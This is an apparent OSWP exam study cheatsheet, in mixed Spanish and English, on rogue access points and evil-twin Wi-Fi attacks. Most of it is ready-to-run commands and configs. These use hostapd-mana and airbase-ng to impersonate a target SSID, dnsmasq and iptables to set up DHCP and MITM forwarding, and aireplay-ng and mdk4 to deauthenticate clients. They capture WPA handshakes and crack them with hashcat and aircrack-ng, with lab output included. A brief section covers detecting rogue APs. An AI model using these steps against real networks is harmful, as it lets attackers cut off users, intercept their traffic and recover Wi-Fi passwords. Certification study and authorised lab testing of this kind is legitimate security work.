# Rogue Access Points (Rogue AP) - OSWP Cheatsheet with Commands and Steps
[fuente](https://cheatsheet.haax.fr/wireless/rogue_ap/)
* What is a Rogue AP?

Unauthorized AP inside a target environment.
Used for unauthorized access, MITM, credential capture.

Tools Used

- Airmon-ng / Airodump-ng / Airbase-ng (aircrack-ng suite)
- Kismet
- Wireshark
- Hostapd
- MDK4

## Responsabilidades de cada tarjeta

- Tarjeta A (AP) — emite el SSID (evil twin / rogue AP), gestiona asociaciones, servidor DHCP/DNS/captive-portal, volcado de handshakes.

- Tarjeta B (Monitor / Inyección) — escanea, captura handshakes, inyecta (deauth), sniffing pasivo y pruebas de inyección.

## Detalle: Tarjeta A — "AP (hostapd / hostapd-mana / airbase)"

- **Responsabilidad principal:** simular/levantar el punto de acceso que quieres que los clientes vean y se conecten.

- **Modo de la interfaz:** AP / master (no monitor). Ej.: wlan1 (no wlan1mon).

### Procesos/servicios típicos que corren sobre esta tarjeta

1. hostapd o hostapd-mana (levanta el SSID, gestiona autenticaciones, opciones mana como mana_wpaout, captive portal integration).

2. dnsmasq (o isc-dhcp-server) para dar IPs vía DHCP y responder DNS si quieres spoofing local.

3. iptables / NAT si quieres dar salida a internet (opcional).

4. Servidor web local (nginx, python -m http.server) o proxy/captive portal si estás recolectando credenciales.

5. Logs y dumps: archivos .hccapx (si hostapd-mana lo genera) o directorio de logs.

#### Comandos de ejemplo (AP)

```bash
# (1) archivo de configuración de hostapd-mana: Target-mana.conf (usa wlan1)
sudo hostapd-mana ./Target-mana.conf       # observa salida en la terminal

# (2) asignar IP a la interfaz levantada por hostapd si es necesario
sudo ip addr add 192.168.50.1/24 dev wlan1
sudo ip link set wlan1 up

# (3) lanzar dnsmasq sobre la interfaz AP
sudo dnsmasq --interface=wlan1 --dhcp-range=192.168.50.10,192.168.50.50,12h

# (4) lanzar servidor web para captive portal (opcional)
python3 -m http.server 80 --directory /ruta/portal &
```
### Qué monitorear

- Salida de hostapd-mana (associations, errors).

- Leases de dhcp: /var/lib/misc/dnsmasq.leases.

- Archivos generados: /tmp/Target.hccapx o mana_logdir.

- iw dev wlan1 station dump para clientes asociados (si el driver lo soporta).

## Detalle: Tarjeta B — "Monitor / Inyección"

- **Responsabilidad principal:** hacer discovery, forzar reconexiones (deauth), capturar handshakes y sniffing.

- **Modo de la interfaz:** monitor (ej.: wlan0mon) — creada con airmon-ng start wlan0 o iw.

### Procesos/servicios/acciones típicas

- airodump-ng para discovery o captura de .cap (handshakes) apuntando al BSSID y canal.

- aireplay-ng para deauthentication (-0) o para pruebas de inyección.

- mdk4 u otras herramientas para ataques de desautenticación masiva (usar solo en laboratorio).

- tcpdump/wireshark para analizar tráfico en vivo.

- Test de inyección: **aireplay-ng -9**.

### Comandos de ejemplo (Monitor)
```bash
# (1) activar monitor
sudo airmon-ng start <interface> <channel>(opcional)   # crea wlan0mon

# (2) discovery / captura general
sudo airodump-ng -w discovery --output-format pcap wlan0mon

# (3) captura dirigida para handshake
sudo airodump-ng -c <CH> --bssid <BSSID> -w capture wlan0mon

# (4) test de inyección
sudo aireplay-ng -9 wlan0mon

# (5) deauth al BSSID real para forzar reconexión
sudo aireplay-ng --deauth 10 -a <BSSID_REAL> wlan0mon
```
### Qué monitorear

* aireplay-ng -9 (test) output: packets injected / received.

* airodump-ng muestra "WPA handshake" en su output cuando ocurre.

* tcpdump -i wlan0mon / Wireshark para ver si deauths salen y si responden.

### Sincronización entre las dos tarjetas (crítica)

- Mismo canal: Asegúrate de que AP (wlan1) y monitor (wlan0mon) estén en el mismo canal del objetivo. Si usas hostapd-mana pon el campo channel= y en la monitor fija el canal con iwconfig wlan0mon channel <CH> o lanzando airodump-ng -c <CH> ....

- Evitar conflictos: No deauths hacia tu propio AP. La deauth debe apuntar al AP real (BSSID real) para forzar clientes a buscar el twin.

- Orden de arranque: normalmente: poner monitor up → discovery → configurar conf AP con passphrase → lanzar hostapd-mana → lanzar dnsmasq → lanzar deauth.

### Qué archivos/logs/outputs revisar por cada tarjeta

- Tarjeta A (AP): stdout de hostapd-mana, /tmp/Target.hccapx, /tmp/mana_logs/*, /var/lib/misc/dnsmasq.leases, iw dev wlan1 station dump.

- Tarjeta B (Monitor): salida de airodump-ng (handshake), aireplay-ng (injection success), pcap files (capture-01.cap), Wireshark visualización.

## Rogue-AP airebase-ng

#### Step 1: Enable Monitor Mode

Before scanning or creating rogue APs, put your wireless interface into monitor mode.

```bash
sudo airmon-ng start wlan0
```
> This creates wlan0mon (monitor mode interface)

#### Step 2: Scan for APs (Detecting Rogue APs)

Use airodump-ng or kismet to list all APs in range:
```bash
sudo airodump-ng wlan0mon
```
Look for unknown SSIDs or BSSIDs
Note ESSID, BSSID (MAC), CH (channel), encryption type

Alternatively, start kismet (has GUI/CLI interface):

```bash
sudo kismet
```
#### Step 3: Analyze Suspected Rogue APs

Check if an AP’s BSSID matches known authorized APs.
Rogue APs might have the same ESSID but different MAC.
Check signal strengths and locations.
Use Wireshark to capture and analyze suspicious traffic:

```bash
sudo wireshark &
```
Capture on wlan0mon and filter by AP MAC or SSID.

#### Step 4: Create a Rogue AP (Evil Twin) for Testing

Use airbase-ng to create a fake AP simulating a legitimate one:

```bash
sudo airbase-ng -e "Target_SSID" -c 6 <interface>(mode:AP)
# Ejemplo
airbase-ng -e "Laboratoriot2.4GHz" -c 11 -W 1 -Z 4 wlan0 
```
- -e specifies the SSID.
- -c specifies the channel to use.

This creates a fake AP broadcasting "Target_SSID" on channel 6.
#### Step 5: Handle DHCP for Rogue AP

To provide IP addresses to clients connecting to your rogue AP, set up a DHCP server:

Example using dnsmasq:
```bash
sudo systemctl stop NetworkManager
```
```bash
sudo ip addr add 192.168.10.1/24 dev at0  # 'at0' is virtual interface created by airbase-ng
```
```bash
sudo dnsmasq --interface=at0 --dhcp-range=192.168.10.10,192.168.10.50,12h
```
Ensure DHCP range does not conflict with the real network.

#### Step 6: Forward Traffic and Enable MITM (Optional)

To forward traffic and enable man-in-the-middle attacks:
```bash
sudo sysctl -w net.ipv4.ip_forward=1

sudo iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
sudo iptables -A FORWARD -i at0 -j ACCEPT
```
Replace wlan0 with your Internet-facing interface.
#### Step 7: Deauthenticate Clients from Legit AP (Force them to connect to Rogue AP)

Use mdk4 or aireplay-ng to send deauth packets:
```bash
sudo mdk4 wlan0mon d -c 6 -b <AP BSSID>
```
or with aireplay-ng:
```bash
sudo aireplay-ng --deauth 10 -a <AP BSSID> wlan0mon

# En caso de:
aireplay-ng -0 0 -a B2:EC:DD:97:BD:10 -c 6E:CB:34:C0:78:F7 wlan1mon
00:52:41  Waiting for beacon frame (BSSID: B2:EC:DD:97:BD:10) on channel 3
00:52:41  wlan1mon is on channel 3, but the AP uses channel 11

# Ejecutar:

iw dev wlan1mon set channel 11
```
Causes clients to disconnect from real AP and possibly connect to your rogue AP.

```bash
airbase-ng -e "Laboratoriot2.4GHz" -c 11 -W 1 -Z 4 wlan1mon
00:48:15  Created tap interface at0
00:48:15  Trying to set MTU on at0 to 1500
00:48:15  Trying to set MTU on wlan1mon to 1800
00:48:15  Access Point with BSSID C0:1C:30:43:0E:5C started.
00:53:40  Client 6E:CB:34:C0:78:F7 associated (WPA2;CCMP) to ESSID: "Laboratoriot2.4GHz"
00:54:00  Client 6E:CB:34:C0:78:F7 associated (WPA2;CCMP) to ESSID: "Laboratoriot2.4GHz"                                                                                                                                                    
00:54:02  Client 6E:CB:34:C0:78:F7 associated (WPA2;CCMP) to ESSID: "Laboratoriot2.4GHz"                                                                                                                                                    
00:56:10  Client 6E:CB:34:C0:78:F7 associated (WPA2;CCMP) to ESSID: "Laboratoriot2.4GHz"                                                                                                                                                    
00:56:29  Client 6E:CB:34:C0:78:F7 associated (WPA2;CCMP) to ESSID: "Laboratoriot2.4GHz"                                                                                                                                                    
00:57:01  Client 6E:CB:34:C0:78:F7 associated (WPA2;CCMP) to ESSID: "Laboratoriot2.4GHz"                                                                                                                                                    
00:57:21  Client 6E:CB:34:C0:78:F7 associated (WPA2;CCMP) to ESSID: "Laboratoriot2.4GHz"                                                                                                                                                    
00:57:39  Client 6E:CB:34:C0:78:F7 associated (WPA2;CCMP) to ESSID: "Laboratoriot2.4GHz"                                                                                                                                                    
00:57:51  Client 6E:CB:34:C0:78:F7 associated (WPA2;CCMP) to ESSID: "Laboratoriot2.4GHz"  
```
#### Step 8: Analyze Captured Data

Use Wireshark to analyze traffic, capture credentials, or data exfiltration.
Look for unencrypted data or weak authentication.

#### Summary of Key Commands:
|Purpose |Command Example|
|--------|-----------------|
|Enable monitor mode |`sudo airmon-ng start wlan0` |
|Scan APs |	`sudo airodump-ng wlan0mon`|
|Start kismet for detection 	|`sudo kismet`|
|Create fake AP (Rogue AP) |`sudo airbase-ng -e "SSID" -c 6 wlan0mon` |
|Setup DHCP server on at0 	|`sudo ip addr add 192.168.10.1/24 dev at0` + `sudo dnsmasq --interface=at0 --dhcp-range=192.168.10.10,192.168.10.50,12h`
|Enable IP forwarding |	`sudo sysctl -w net.ipv4.ip_forward=1`|
|Setup NAT for routing 	|`sudo iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE`|
|Send deauth packets 	|`sudo mdk4 wlan0mon d -c 6 -b <AP BSSID>` or `sudo aireplay-ng --deauth 10 -a <AP BSSID> wlan0mon`

-------

## Rogue-AP - hostapd-mana

### Setup inicial

```bash
# Para evitar interferencias mientras pruebas (opcional)
sudo systemctl stop NetworkManager
sudo airmon-ng check kill
```
### Discovery
>Con Interfaz modo monitor
```bash
sudo airodump-ng -w discovery --output-format pcap --channel <canal-AP-Victima> <monitor-interface>
```
```bash
# filtro eapol
wireshark discovery-01.cap
```
En base a lo que veamos en wireshark debemos aramar el archivo de configuracion.

### Creacion del Access Point
#### A. Crear archivo configuracion
```bash
cat <essid>-mana.conf
interface=<AP-interface> # Interfaz Punto de Acceso
ssid=<essid>
channel=1 # mismo canal que el AP victima
hw_mode=g # banda a 2,4 GHz
ieee80211n=1 # 802.11n
wpa=3 # WPA/WPA2
wpa_key_mgmt=WPA-PSK # autenticación PSK
wpa_passphrase=ANYPASSWORD # configurar la clave
wpa_pairwise=TKIP CCMP # habilitar el cifrado TKIP/CCMP con WPA1
rsn_pairwise=TKIP CCMP # habilitar TKIP/CCMP con cifrado WPA2
mana_wpaout=/home/kali/<essid>.hccapx # output de protocolos de enlace capturados
```

#### B. Captura protocolos de enlace (handshake)
```bash
sudo hostapd-mana <essid>-mana.conf 
```

#### C. Deautenticamos clientes con la otra tarjeta de red en modo monitor

```bash
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF <monitor-interface>
```

**C.1 Crackeamos protocolo de enlace (handshake)**

Una vez obtenido el handshake convertimos discovery-01.cap

```bash
hcxpcapngtool -o Laboratorio2.hccapx discovery-01.cap

hcxpcapngtool -o Laboratorio2.hc22000 discovery-01.cap   # recomendado
# crackeo con hashcat
hashcat -m 22000 Laboratorio2.hc22000 wordlist.txt
```

```bash
aircrack-ng -w /home/kali/Notes/OSWP/test-wordlist.txt discovery-01.cap
```